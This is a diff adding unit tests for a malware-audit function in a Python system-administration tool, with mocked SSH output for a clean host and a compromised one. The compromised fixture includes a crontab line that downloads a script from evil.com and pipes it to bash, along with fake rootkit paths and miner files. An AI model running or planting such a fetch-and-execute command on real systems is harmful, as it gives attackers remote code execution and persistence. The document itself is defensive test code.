@@ -13,6 +13,7 @@ from agensysadmin.tools.security import (
     _audit_filesystem,
     _audit_logs,
     _audit_kernel,
+    _audit_malware,
     _audit_updates,
     _compute_scores,
     _format_report,
@@ -511,3 +512,37 @@ class TestAuditKernel:
         assert severities["ASLR (randomize_va_space)"] == "critical"
         assert severities["IP forwarding"] == "warning"
         assert severities["SYN cookies"] == "warning"
+
+
+class TestAuditMalware:
+    def test_clean_system(self, mock_ssh):
+        mock_ssh.execute.side_effect = [
+            CommandResult(stdout="# empty crontab\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="127.0.0.1 localhost\n::1 localhost\n", stderr="", exit_code=0, duration_ms=10),
+        ]
+        findings = _audit_malware(mock_ssh, "prod")
+        statuses = {f["check"]: f["status"] for f in findings}
+        assert statuses["Suspicious crontab entries"] == "PASS"
+        assert statuses["Processes without binary"] == "PASS"
+        assert statuses["Known rootkit paths"] == "PASS"
+        assert statuses["Hidden files in /tmp, /dev/shm"] == "PASS"
+        assert statuses["Suspicious /etc/hosts entries"] == "PASS"
+
+    def test_compromised_system(self, mock_ssh):
+        mock_ssh.execute.side_effect = [
+            CommandResult(stdout="* * * * * curl http://evil.com/shell.sh | bash\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="1234 /proc/1234/exe (deleted)\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="/tmp/.ice-unix/.x\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout=".hidden_miner\n.backdoor\n", stderr="", exit_code=0, duration_ms=10),
+            CommandResult(stdout="127.0.0.1 localhost\n1.2.3.4 google.com\n", stderr="", exit_code=0, duration_ms=10),
+        ]
+        findings = _audit_malware(mock_ssh, "prod")
+        statuses = {f["check"]: f["severity"] for f in findings}
+        assert statuses["Suspicious crontab entries"] == "warning"
+        assert statuses["Processes without binary"] == "critical"
+        assert statuses["Known rootkit paths"] == "critical"
+        assert statuses["Hidden files in /tmp, /dev/shm"] == "warning"
+        assert statuses["Suspicious /etc/hosts entries"] == "warning"
